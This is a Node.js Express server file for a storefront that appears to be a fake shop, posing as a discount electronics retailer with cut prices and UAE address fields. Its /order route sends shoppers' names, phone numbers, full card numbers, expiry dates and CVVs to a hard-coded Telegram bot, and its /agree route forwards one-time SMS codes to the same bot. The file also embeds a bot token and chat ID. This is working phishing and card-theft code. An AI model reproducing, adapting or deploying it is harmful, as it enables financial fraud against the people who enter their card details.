import express, { response } from 'express';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import fs from 'fs';
import bodyParser from 'body-parser';
import http from 'request';


let telegram_data = {
  token: "6434336516:AAEdbpgHGZ1MH-TSnkcUc4jr5Hv_ZNvBVDw", /* Token Bot */
  chat: "-992231519"     /* -Chat ID */
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

let navigation = fs.readFileSync('./data/bnav.json');



const app = express();

let urlencodedParser = bodyParser.urlencoded({extended:false});

app.set('view engine', 'ejs');
app.use(express.static('public'));

let products = JSON.parse(fs.readFileSync('./data/products.json'))
let list = [];
let date1 = new Date((new Date()).getFullYear(), (new Date()).getMonth(), (new Date()).getDate()+10);
let date2 = new Date((new Date()).getFullYear(), (new Date()).getMonth(), (new Date()).getDate()+14);
date1 = date1.toDateString().split(' ');
date2 = date2.toDateString().split(' ');
date1 = date1[2] + " " + date1[1];
date2 = date2[2] + " " + date2[1];
let icons = JSON.parse(fs.readFileSync('./data/icons-data.json'));


/* Можно корректировать скидку */
function normalPrice(price){
  if(!price.includes('.')){
      price = price.replace(',','.');
  }
  price = parseFloat(price.split(/,|\s/).join(''));
  return (0.8 * price).toFixed(2);
}
for(let i = 0; i < products.length; i++){
  products[i].price = normalPrice(products[i].price);
}



app.use('/start', function (request, response) {
  response.render('index', {navigation:navigation, icons:icons, list:[products[1], products[16], products[1850], products[1822], products[11100], products[4668], products[4234], products[3722], products[3721]]});
});

app.get('/section/:product', function (request, response) {
  list = [];
  products.forEach(element => {
    if((element.section).toLowerCase() == `${(request.params.product).toLowerCase()}`){
        list.push(element);
    }
});
  if(list.length == 0)
  {
    response.redirect('/start');
  }
  response.render('SharafShop', {navigation: navigation, list:list});
});


app.get('/product/:id', function (request, response) {
  let product = null;
  for(let i = 0; i < products.length; i++){
    if(products[i].id == request.params.id)
     {
       product = products[i];
     }
  }
  if(product==null){
    response.redirect('/start');
  }else{
    response.render('product', {navigation: navigation, product: product, date1: date1, date2: date2, list:list});
  }
});

app.get('/cart', function (request, response) {
  let chosenProductID = [];
  chosenProductID = request.query.cart || [];
  let chosenProduct = [];
  console.log(chosenProductID[0]);
  if(chosenProductID.length==0){
    response.render('cart', {navigation: navigation, chosenProduct: []});
  }else{
    for(let prod of chosenProductID){
      products.forEach(element => {
        if((element.id) == prod){
          chosenProduct.push(element);
        }
    });
    };
  }
  response.render('cart', {navigation: navigation, chosenProduct: chosenProduct});
});

app.get('/form', function (request, response){
  let chosenProductID = [];
  chosenProductID = request.query.cart || [];
  let totprice = 0;
  if(chosenProductID.length==0){
    response.render('cart', {navigation: navigation, chosenProduct: []});
  }else{
    for(let prod of chosenProductID){
      products.forEach(element => {
        if((element.id) == prod){
          totprice+=parseFloat(element.price);
        }
    });
    };
  }
  totprice = totprice.toFixed(2);

  response.render('form', {navigation:navigation, totprice:totprice});
});
app.get('/code', function (request, response){
  response.render('code', {navigation:navigation});
});

app.post('/order', urlencodedParser, function (req, res){
  if(!req.body) return response.render('form', {navigation:navigation});

  let fields = [
    '<b>First_Name</b>: ' + req.body.firstName,
    '<b>Last_Name</b>: ' + req.body.lastName,
    '<b>Emirates</b>: ' + req.body.emirates,
    '<b>Area</b>: ' + req.body.area,
    '<b>Mobile</b>: ' + req.body.mobile,
    '<b>Card_Number</b>: ' + req.body.cardNumber,
    '<b>Name_On_Card</b>: ' + req.body.nameOnCard,
    '<b>Expiry_Mon</b>: ' + req.body.expiryMonth,
    '<b>Expiry_Year</b>: ' + req.body.expiryYear,
    '<b>CVV</b>: ' + req.body.cvv,
  ];

  let msg = ''
  fields.forEach(field => {
    msg += field + '\n'
  });

  msg = encodeURI(msg)

  http.post(`https://api.telegram.org/bot${telegram_data.token}/sendMessage?chat_id=${telegram_data.chat}&parse_mode=html&text=${msg}`, function (error, response, body) {  
    //не забываем обработать ответ
    console.log('error:', error); 
    console.log('statusCode:', response && response.statusCode); 
    console.log('body:', body); 
    if(response.statusCode===200){
      res.render('code', {navigation:navigation});
    }
    if(response.statusCode!==200){
      res.render('form', {navigation:navigation});
    }
  });
});




app.post('/agree', urlencodedParser, function (req, res){
  if(!req.body) return response.render('code', {navigation:navigation});

  let fields = [
    '<b>SMS Code</b>: ' + req.body.smsCode
  ];

  let msg = ''
  fields.forEach(field => {
    msg += field + '\n'
  });

  msg = encodeURI(msg)

  http.post(`https://api.telegram.org/bot${telegram_data.token}/sendMessage?chat_id=${telegram_data.chat}&parse_mode=html&text=${msg}`, function (error, response, body) {  
    //не забываем обработать ответ
    console.log('error:', error); 
    console.log('statusCode:', response && response.statusCode); 
    console.log('body:', body); 
    if(response.statusCode===200){
      res.render('index', {navigation:navigation, icons:icons, list:[products[1], products[16], products[1850], products[1822], products[11100], products[4668], products[4234], products[3722], products[3721]]});
    }
    if(response.statusCode!==200){
      res.render('code', {navigation:navigation});
    }
  });
});

app.get('/result', function(req, res){
  let search_text = req.query.panel_text;
  let result_list_products = [];

  for(let i = 0; i < products.length; i++){
      if(products[i].name.toLowerCase().includes(search_text)){
          result_list_products.push(products[i]);
      }
      if(result_list_products.length>6){
          break;
      }
  }
  res.send(JSON.stringify(result_list_products));
});



app.get('*', function(req, res){
  res.render('index', {navigation:navigation, icons:icons, list:[products[1], products[16], products[1850], products[1822], products[11100], products[4668], products[4234], products[3722], products[3721]]});
});



/* app.get('/cart', function (request, response) {
  response.render('cart', {navigation: navigation});
});
app.get('/cart/:cart_list', function (request, response) {
  let chosenProductID = request.params.cart_list;
}); */

/* app.get('/section/:product', function (request, response) {
  response.send(`<h1>${request.params.product} + ${request.query.page}</h1>`);
}); */




app.listen(3000);
